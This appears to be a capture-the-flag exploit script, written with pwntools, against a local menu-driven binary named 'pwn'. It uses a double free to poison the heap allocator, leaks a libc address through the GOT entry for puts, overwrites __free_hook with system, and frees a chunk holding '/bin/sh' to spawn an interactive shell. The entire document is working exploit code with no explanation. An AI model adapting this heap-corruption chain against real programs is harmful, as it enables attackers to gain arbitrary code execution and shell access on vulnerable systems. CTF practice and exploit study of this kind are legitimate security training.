from pwn import *
context.log_level = 'DEBUG'

sh = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(content,ids):
    sh.sendline('1')
    sh.recvuntil('added item?\n')
    sh.sendline(content)
    sh.recvuntil('of items?')
    sh.sendline(str(ids))
    sh.recvuntil("choice:\n")
def delete(idx):
    sh.sendline('2')
    sh.recvuntil('deleted item?')
    sh.sendline(str(idx))
    sh.recvuntil("choice:\n")
    
def show():
    sh.sendline('3')
    sh.recvuntil('num:49.\n')
    sh.recvuntil('name:')
    data = sh.recvuntil(',',drop=True)
    sh.recvuntil("choice:\n")
    return data
def edit(idx,content):
    sh.sendline('4')
    sh.recvuntil('index of the edit item?\n')
    sh.sendline(str(idx))
    sh.recvuntil('name of the edit item?\n')
    sh.sendline(content)
    sh.recvuntil("choice:\n")

add('111',0x31) #0

add('333',1) #1
add('/bin/sh\x00',2) #2
add('222',0) #3

add('555',0)
delete(3)
delete(1)
delete(3)
add(p64(0x6020c0),0) #3
add('1',0) #3
add('1',0) #3
add(p64(0x6020c0),4) #3 6020d0
edit(3,p64(0x602020)) 
libc_base = u64(show().ljust(8,'\x00')) - libc.symbols['puts']
log.success('libc_base = ' + hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
edit(3,p64(free_hook)) 
edit(1,p64(system))
delete(2)
sh.interactive()